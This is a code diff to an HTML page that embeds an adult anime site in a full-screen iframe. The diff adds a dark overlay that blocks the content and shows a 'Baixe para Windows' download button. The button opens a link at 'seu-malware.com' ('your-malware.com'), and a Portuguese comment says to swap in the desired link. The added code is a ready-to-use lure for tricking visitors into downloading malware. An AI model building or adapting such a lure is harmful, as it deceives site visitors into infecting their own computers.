@@ -19,6 +19,26 @@
             height: 100%;
             border: none;
         }
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); /* Fundo semi-transparente */
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #download-button {
+            padding: 15px 30px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
+        }
         #fullscreen-button {
             position: fixed;
             bottom: 20px;
@@ -28,13 +48,17 @@
             color: white;
             border: none;
             cursor: pointer;
-            z-index: 1000;
+            z-index: 1001;
         }
     </style>
 </head>
 <body>
     <div id="iframe-container">
         <iframe id="iframe" src="https://animeshentai.biz/hentai/" width="100%" height="100%" frameborder="0"></iframe>
+    </div>
+
+    <div id="overlay">
+        <button id="download-button">Baixe para Windows</button>
     </div>
 
     <script>
@@ -56,6 +80,12 @@
             } else {
                 fullscreenButton.textContent = 'Tela Cheia';
             }
+        });
+
+        // Abrir link ao clicar no botão de download
+        document.getElementById('download-button').addEventListener('click', () => {
+            // Substitua o link abaixo pelo link desejado
+            window.open('https://seu-malware.com/download-windows', '_blank');
         });
     </script>
 </body>
